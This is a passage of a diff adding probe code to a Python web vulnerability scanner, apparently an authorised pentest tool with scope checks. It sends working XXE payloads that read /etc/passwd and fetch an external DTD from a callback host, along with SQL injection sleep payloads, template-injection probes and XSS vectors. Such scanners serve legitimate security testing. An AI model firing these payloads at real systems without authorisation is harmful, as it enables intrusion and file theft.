+    multiple file targets (/etc/passwd first for its zero-FP `root:x:` signature,
+    then /etc/hostname, then win.ini) AND multiple root-element shapes (`<r>` and
+    `<data><item>`) so detection matches whichever echo format the server uses."""
+    out: list[dict] = []
+    # 1. In-band XXE — try each (payload, signature) pair. Stop on the first hit so
+    #    we don't double-report. `root:x:` from /etc/passwd is a canonical, zero-FP
+    #    marker; the hostname/win.ini signatures are the fallback. We also look for
+    #    the signature ANYWHERE in the response body (not just inside the requested
+    #    element) because some parsers wrap the output in different tags.
+    for payload, sig_re, label in _XXE_PROBES:
+        r = sess.post(base_url, data=payload,
+                      headers={"Content-Type": "application/xml"},
+                      cls="xxe")
+        if r is None or not r.text:
+            continue
+        m = sig_re.search(r.text)
+        if not m:
+            continue
+        # Guard against trivial false positives: for the /etc/hostname-shape regex
+        # (which captures the element content), it's possible the server echoes
+        # OUR literal payload text (which contains <r>&e;</r> after an unresolved
+        # parse) rather than an expanded entity. If the capture is 'e'/'amp' (the
+        # unexpanded entity name) skip. The guard applies ONLY to regexes with a
+        # capture group — passwd/win.ini regexes have no group and are already
+        # unambiguous enough on their own to confirm the exploit.
+        if sig_re.groups >= 1:
+            try:
+                captured = (m.group(1) or "").lower()
+            except (IndexError, re.error):
+                captured = ""
+            if captured in ("e", "amp", ""):
+                continue
+        # Severity: critical for /etc/passwd (full account inventory + user list),
+        # high for hostname / win.ini (less sensitive but still a file-read primitive).
+        sev = "critical" if "passwd" in label else "high"
+        out.append({"type": "xxe", "severity": sev,
+                    "url": base_url, "param": "",
+                    "evidence": (f"server expanded SYSTEM file:// entity — {label} "
+                                 f"(matched {m.group(0)[:60]!r})"),
+                    "confirmed": True})
+        return out
+    # 2. Blind XXE via OAST: inject an external DTD URL — if the parser is XXE-vulnerable
+    # it will fetch our canary DTD. The orchestrator correlates the inbound DNS lookup
+    # at phase-end and promotes to a finding there (not here).
+    oast = _oast_canary("xxe")
+    if oast:
+        blind_payload = (
+            '<?xml version="1.0"?>\n'
+            f'<!DOCTYPE r SYSTEM "{oast}xxe.dtd">\n'
+            '<r>x</r>\n'
+        )
+        sess.post(base_url, data=blind_payload,
+                  headers={"Content-Type": "application/xml"},
+                  cls="xxe_blind_oast")
+    return out
+
+
+def _send(sess: _Session, base_url: str, method: str, content_type: str,
+          params: dict, cls: str, allow_redirects: bool = False):
+    """Dispatch a request with the chosen method + content-type. GET puts params in the
+    query string; POST puts them in the body (urlencoded by default, JSON when
+    content_type is "application/json"). All existing probes used sess.get directly —
+    this wrapper is used by the SSTI/SQLi/XSS probes so a single probe body covers both
+    GET (search/filter sinks) and POST (register/feedback/comment sinks) without a
+    second implementation."""
+    if method == "post":
+        if content_type == "application/json":
+            try:
+                body = json.dumps(params)
+            except Exception:
+                return None
+            headers = {"Content-Type": "application/json"}
+        else:
+            body = urlencode(params)
+            headers = {"Content-Type": "application/x-www-form-urlencoded"}
+        return sess.post(base_url, data=body, headers=headers, cls=cls)
+    # GET
+    url = f"{base_url}{'&' if '?' in base_url else '?'}{urlencode(params)}"
+    return sess.get(url, cls=cls, allow_redirects=allow_redirects)
+
+
+def _probe_ssti(sess: _Session, base_url: str, pinned_param: str,
+                method: str, content_type: str) -> list[dict]:
+    """Jinja2 / Mako / FreeMarker / Thymeleaf / ERB / PHP SSTI via arithmetic proof.
+    Only fires on expressions that resolve to numeric literals the raw payload doesn't
+    already contain — eliminates the false-positive of payload-reflection-as-text."""
+    out: list[dict] = []
+    for p in _param_list(pinned_param, _SSTI_PARAMS):
+        for payload, expected in _SSTI_PROBES:
+            r = _send(sess, base_url, method, content_type, {p: payload}, cls="ssti")
+            if r is None or not r.text:
+                continue
+            body = r.text
+            # The expected arithmetic result appeared AND the raw payload DID NOT
+            # (if the raw payload is in the body, it's just reflection, not evaluation).
+            if expected in body and payload not in body:
+                out.append({"type": "ssti", "severity": "critical",
+                            "url": base_url, "param": p, "payload": payload,
+                            "evidence": f"template engine evaluated {payload} -> {expected}",
+                            "method": method, "confirmed": True})
+                return out
+    return out
+
+
+def _probe_sqli_boolean(sess: _Session, base_url: str, pinned_param: str,
+                         method: str, content_type: str) -> list[dict]:
+    """Error-based + boolean-differential SQLi. Error-based is a strong signal (DBMS
+    stack trace in response); boolean-differential compares true-vs-false payload
+    responses and flags when they differ substantially — a textbook blind SQLi tell."""
+    out: list[dict] = []
+    for p in _param_list(pinned_param, _SQLI_PARAMS):
+        baseline = _send(sess, base_url, method, content_type, {p: "1"},
+                         cls="sqli_boolean")
+        if baseline is None or baseline.text is None:
+            continue
+        base_len = len(baseline.text)
+        for true_pl, false_pl in _SQLI_BOOLEAN_PROBES:
+            r_t = _send(sess, base_url, method, content_type, {p: true_pl},
+                        cls="sqli_boolean")
+            r_f = _send(sess, base_url, method, content_type, {p: false_pl},
+                        cls="sqli_boolean")
+            if r_t is None or r_f is None:
+                continue
+            # Error-based wins outright — a DBMS error means user input hit the SQL
+            # layer unescaped.
+            for rsp, which in ((r_t, true_pl), (r_f, false_pl)):
+                if rsp.text:
+                    m = _SQLI_ERROR_SIGS.search(rsp.text)
+                    if m:
+                        out.append({"type": "sqli_error", "severity": "high",
+                                    "url": base_url, "param": p, "payload": which,
+                                    "evidence": f"SQL error in response: {m.group(0)[:80]}",
+                                    "method": method, "confirmed": True})
+                        return out
+            # Boolean-differential: a true/false pair that produces materially different
+            # response bodies is strong evidence that the server condition evaluated the
+            # payload. Threshold: absolute diff > max(200 bytes, 20% of baseline).
+            t_len = len(r_t.text or "")
+            f_len = len(r_f.text or "")
+            diff = abs(t_len - f_len)
+            if diff > max(200, int(base_len * 0.2)):
+                out.append({"type": "sqli_boolean", "severity": "high",
+                            "url": base_url, "param": p, "payload": true_pl,
+                            "evidence": (f"boolean-differential: true-payload -> {t_len}B, "
+                                         f"false-payload -> {f_len}B (baseline {base_len}B)"),
+                            "method": method, "confirmed": True})
+                return out
+    return out
+
+
+def _probe_sqli_time(sess: _Session, base_url: str, pinned_param: str,
+                      method: str, content_type: str) -> list[dict]:
+    """Time-based blind SQLi. Measures a baseline, then injects DBMS-specific sleep
+    payloads; a response that takes >= baseline + (DELAY-1) seconds TWICE in a row
+    (first attempt + confirmation) is a confirmed time-based SQLi. Covers MySQL
+    (SLEEP), PostgreSQL (pg_sleep), MSSQL (WAITFOR DELAY), Oracle (dbms_pipe)."""
+    import time
+    out: list[dict] = []
+    DELAY = 5
+    # Baseline latency on this endpoint with a harmless probe
+    t0 = time.time()
+    bl = _send(sess, base_url, method, content_type, {"vapt_bl": "1"}, cls="sqli_time")
+    baseline = (time.time() - t0) if bl is not None else 0.0
+    probes = (
+        f"' OR SLEEP({DELAY})-- -",           # MySQL/MariaDB
+        f"'; WAITFOR DELAY '0:0:{DELAY}'-- ",  # MSSQL
+        f"' OR pg_sleep({DELAY})-- -",         # PostgreSQL
+        f"' AND SLEEP({DELAY})-- -",
+        f"1 OR SLEEP({DELAY})",                # unquoted numeric
+    )
+    for p in _param_list(pinned_param, _SQLI_PARAMS):
+        for payload in probes:
+            t = time.time()
+            r = _send(sess, base_url, method, content_type, {p: payload}, cls="sqli_time")
+            elapsed = time.time() - t
+            if r is None or elapsed < baseline + (DELAY - 1):
+                continue
+            # Confirm with retry — one slow response could just be a slow endpoint.
+            t2 = time.time()
+            r2 = _send(sess, base_url, method, content_type, {p: payload},
+                       cls="sqli_time")
+            elapsed2 = time.time() - t2
+            if r2 is None or elapsed2 < baseline + (DELAY - 1):
+                continue
+            out.append({"type": "sqli_time", "severity": "critical",
+                        "url": base_url, "param": p, "payload": payload,
+                        "evidence": (f"time-based SQLi: {elapsed:.1f}s + {elapsed2:.1f}s "
+                                     f"vs baseline {baseline:.1f}s"),
+                        "method": method, "confirmed": True})
+            return out
+    return out
+
+
+def _probe_xss_reflected(sess: _Session, base_url: str, pinned_param: str,
+                          method: str, content_type: str) -> list[dict]:
+    """Reflected XSS: inject a unique random canary wrapped in script/attribute contexts
+    and check that the canary appears UNESCAPED in the response (i.e. inside <script>,
+    an on* handler, or a javascript: href). Pure canary reflection without a dangerous
+    context is NOT reported (that's just echo, not XSS)."""
+    import secrets
+    out: list[dict] = []
+    canary = f"vApT{secrets.token_hex(4)}xSs"
+    payloads = (
+        f"<script>{canary}</script>",
+        f'"><script>{canary}</script>',
+        f"' onmouseover='{canary}'",
+        f'<svg onload="{canary}">',
+        f"javascript:{canary}",
+    )
+    for p in _param_list(pinned_param, _XSS_PARAMS):
+        for payload in payloads:
+            r = _send(sess, base_url, method, content_type, {p: payload},
+                      cls="xss_reflected")
+            if r is None or not r.text:
+                continue
+            body = r.text
+            if canary not in body:
+                continue
+            # Canary reflected — check whether it's in an EXECUTABLE context.
+            dangerous = (f"<script>{canary}" in body
+                         or f"onmouseover='{canary}" in body
+                         or f'onload="{canary}' in body
+                         or f"javascript:{canary}" in body)
+            if dangerous:
+                out.append({"type": "xss_reflected", "severity": "high",
+                            "url": base_url, "param": p, "payload": payload,
+                            "evidence": f"payload reflected into executable context "
+                                        f"(canary {canary})",
+                            "method": method, "confirmed": True})
+                return out
+    return out
+
+
+def main() -> int:
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--target", required=True,
+                    help="in-scope host (hostname/IP) — ALL probe URLs must match this")
+    ap.add_argument("--url", required=True,
+                    help="full http(s) base URL on the target")
+    ap.add_argument("--param", default="",
+                    help="optional param name to pin from arjun/wapiti (tried alongside the "
+                         "class-specific common list)")
+    ap.add_argument("--classes",
+                    default=("open_redirect,path_traversal,ssrf_localhost,sensitive_content,"
+                             "xxe,cmd_injection,crlf,ssti,sqli,xss"),
+                    help="comma-separated subset of classes to run. Expanded set: open_redirect,"
+                         "path_traversal,ssrf_localhost,sensitive_content,xxe,cmd_injection,"
+                         "crlf,ssti,sqli (= sqli_boolean + sqli_time),xss (= xss_reflected)")
+    ap.add_argument("--method", default="get", choices=("get", "post"),
+                    help="HTTP method for parameterised probes. POST sends params in the "
+                         "body (urlencoded by default; application/json when "
+                         "--data-content-type is set). GET-only probes (sensitive_content, "
+                         "xxe) ignore this.")
+    ap.add_argument("--data-content-type",
+                    default="application/x-www-form-urlencoded",
+                    help="For --method=post: body Content-Type. Pass application/json to "
+                         "send params as a JSON body instead of urlencoded form data.")
+    ap.add_argument("--insecure", action="store_true",
+                    help="disable TLS verification (for lab targets with self-signed certs)")
+    ap.add_argument("--debug", action="store_true",
+                    help="also emit the per-request trace to stderr (always included in the "
+                         "JSON record for the normalizer to log)")
+    args = ap.parse_args()
+
+    base_url = args.url
+    if not base_url.lower().startswith(("http://", "https://")):
+        print(json.dumps({"error": "url must be http(s)", "findings": []}))
+        return 0
+    if not _in_scope(args.target, base_url):
+        print(json.dumps({"error": "url off-scope", "findings": []}))
+        return 0
+
+    classes = {c.strip() for c in args.classes.split(",") if c.strip()}
+    # Group E: harvest query-param names from the base URL and surface them to
+    # every _param_list() call so a URL like /dl?file=x probes `file` right
+    # after any arjun pin. Order-preserving + de-duped so a stable probe plan
+    # falls out. Empty query → identical behavior to before this change.
+    global _URL_QUERY_PARAMS
+    try:
+        from urllib.parse import parse_qsl
+        _URL_QUERY_PARAMS = tuple(dict.fromkeys(
+            k for k, _ in parse_qsl(urlparse(base_url).query, keep_blank_values=True)
+            if k
+        ))
+    except Exception:
+        _URL_QUERY_PARAMS = ()
+    cookie, cookie_src = _load_cookie()
+    sess = _Session(cookie, insecure=args.insecure)
+
+    findings: list[dict] = []
+    method = args.method
+    content_type = args.data_content_type
+    try:
+        if "open_redirect" in classes:
+            findings += _probe_open_redirect(sess, base_url, args.param)
+        if "path_traversal" in classes:
+            findings += _probe_path_traversal(sess, base_url, args.param)
+        if "ssrf_localhost" in classes:
+            findings += _probe_ssrf_localhost(sess, base_url, args.param)
+        if "sensitive_content" in classes:
+            findings += _probe_sensitive_content(sess, base_url, args.target)
+        if "xxe" in classes:
+            findings += _probe_xxe(sess, base_url)
+        if "cmd_injection" in classes:
+            findings += _probe_cmd_injection(sess, base_url, args.param)
+        if "crlf" in classes:
+            findings += _probe_crlf(sess, base_url, args.param)
+        if "ssti" in classes:
+            findings += _probe_ssti(sess, base_url, args.param, method, content_type)
+        # "sqli" expands to both boolean + time variants; the operator can pin one.
+        if "sqli" in classes or "sqli_boolean" in classes:
+            findings += _probe_sqli_boolean(sess, base_url, args.param,
+                                             method, content_type)
+        if "sqli" in classes or "sqli_time" in classes:
+            findings += _probe_sqli_time(sess, base_url, args.param,
+                                          method, content_type)
+        # "xss" is the reflected variant (DOM-XSS lives in dalfox).
+        if "xss" in classes or "xss_reflected" in classes:
+            findings += _probe_xss_reflected(sess, base_url, args.param,
+                                              method, content_type)
+    except Exception as e:
+        print(json.dumps({"error": f"probe failed: {e}",
+                          "findings": findings, "trace": sess.trace,
+                          "cookie_src": cookie_src}))
+        return 0
+
+    _budget_cap = 320  # keep in sync with _Session.__init__
+    record = {"findings": findings, "trace": sess.trace,
+              "cookie_src": cookie_src,
+              "budget_used": _budget_cap - sess.budget}
+    if args.debug:
+        print(f"[vapt-web-probe] cookie={cookie_src} "
+              f"budget_used={_budget_cap - sess.budget} "
+              f"findings={len(findings)}", file=sys.stderr)
+        for t in sess.trace:
+            print(f"[vapt-web-probe]   {t['cls']:<18} {t['status']} {t['url']}",
+                  file=sys.stderr)
+    print(json.dumps(record))
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
